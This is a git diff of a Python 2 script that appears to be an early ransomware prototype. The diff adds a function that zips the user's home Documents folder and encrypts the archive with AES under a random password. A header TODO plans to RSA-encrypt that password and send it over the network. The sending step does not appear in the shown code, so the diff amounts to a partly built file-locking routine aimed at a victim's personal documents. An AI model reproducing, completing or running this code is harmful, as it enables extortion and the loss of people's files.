@@ -5,7 +5,8 @@ TODO: Encrypt password using RSA and send it over network
 
 import os, random, struct, string
 from Crypto.Cipher import AES
-import hashlib
+from pbkdf2 import PBKDF2
+from zip import zipdir
 
 def generate_RSA(bits=2048):
     '''
@@ -20,7 +21,8 @@ def generate_RSA(bits=2048):
     return private_key, public_key
 
 def randomword(length):
-   return ''.join(random.choice(string.lowercase) for i in range(length))
+    chars = string.lowercase+string.digits+string.uppercase
+    return ''.join(random.choice(chars) for i in range(length))
 
 def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
     """ Encrypts a file using AES (CBC mode) with the
@@ -119,11 +121,23 @@ def decrypt_RSA(private_key_loc, package):
     decrypted = rsakey.decrypt(b64decode(package)) 
     return decrypted
 
+def encrypt(path=""):
+    from os.path import expanduser
+    home = expanduser("~")
+    path = home + "/Documents"
+    zipPath = home + "/Documents.zip"
+    # path = "C:/Users/Matt/Desktop/bob"
+    # zipPath = "C:/Users/Matt/Desktop/bob.zip"
+
+    zipdir(path,zipPath)
+
+    password = randomword(64)
+    salt = os.urandom(8)
+    key = PBKDF2(password,salt).read(32)
+    encrypt_file(key,zipPath)
+
+    return salt,password,path
+
 
 if __name__ == '__main__':
-    # password = 'thisisastupidlongpassword'
-    # key = hashlib.sha256(password).digest()
-    # encrypt_file(key, '/Users/matt/Desktop/Python.zip')
-    # decrypt_file(key,'/Users/matt/Desktop/Python.zip.enc')
-    pub, priv = generate_RSA()
-    print pub
+    print encrypt()
